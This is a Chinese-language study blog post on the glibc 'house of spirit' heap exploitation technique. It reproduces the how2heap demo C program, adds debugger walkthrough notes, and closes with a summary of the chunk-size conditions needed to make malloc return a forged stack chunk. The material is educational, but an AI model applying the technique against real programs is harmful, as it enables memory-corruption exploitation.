---
title: house_of_spirit
date:  2020-08-13 09:43:41
updated:  2020-08-13 09:43:41
tags:
    - heap
    - pwn
    - house_of_spirit
categories: 
	- 二进制安全
	- how2heap
use:
  - Valine
text: true
lazyload: true
count: true
---

# 源码

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

# 运行结果

![image.png](https://i.loli.net/2020/11/17/U3LFzwqlJ1CpeZA.png)

# 分析&调试

就是在栈上伪造了chunk，然后free掉，之后再malloc就会malloc到栈上

调试：

该开始先malloc（1）：

![image.png](https://i.loli.net/2020/11/17/WUkOdSMvqGfwxmT.png)

之后声明一个指针变量a和fake_chunks[10]数组（对齐的）:

这时a的值为0，地址为0x7fffffffdc18

fake_chunks的地址为0x7fffffffdc20,紧接着a

![image.png](https://i.loli.net/2020/11/17/vbNyKwHMRa9cDep.png)

接下来我们要伪造chunk了

首先fack_chunks[1]=40，这就是伪造的第一个chunk的伪造的size字段，伪造了大小为40

![image.png](https://i.loli.net/2020/11/17/qBP15o8WTbSlkeD.png)

然后fake_chunks[9] = 0x1234，这就是伪造的第二个chunk的伪造的size字段的值

到此为止，两个chunk大小伪造好了

![image.png](https://i.loli.net/2020/11/17/NdjrBPn6FMD2iIw.png)

接下来将a赋值为我们伪造的第一个chunk的mem指针的值，也就是0x7fffffffdc30,这样a就指向了我们伪造的第一个chunk

![image.png](https://i.loli.net/2020/11/17/N7qd9zVJegPQ3GU.png)

这之后我们free(a)

就会发现我们伪造的chunk成功到了fastbin中

![image.png](https://i.loli.net/2020/11/17/xqc49Jg5nt6CdZX.png)

这样的话我们接下来再进行malloc相同大小就会malloc到栈上了，我们伪造的chunk成功被malloc出去

![image.png](https://i.loli.net/2020/11/17/hOMXdwje78kmsaS.png)

# 总结

- 发生栈溢出时，若是能覆盖某个即将free的指针，我们可以将这个指针改成栈上的地址，并且在栈上这个地址上伪造一个chunk，free后再malloc相同大小就malloc到伪造的chunk了
- size字段的三个标志位前两个必须是0（否则就到不了fast bin里了）
- size本身需要符合fast bin的大小
- next chunk大小也必须>2*SIZE_SZ&&<system_mem,否则会报invalid next size的错误。(64位下就是16B<<128kb)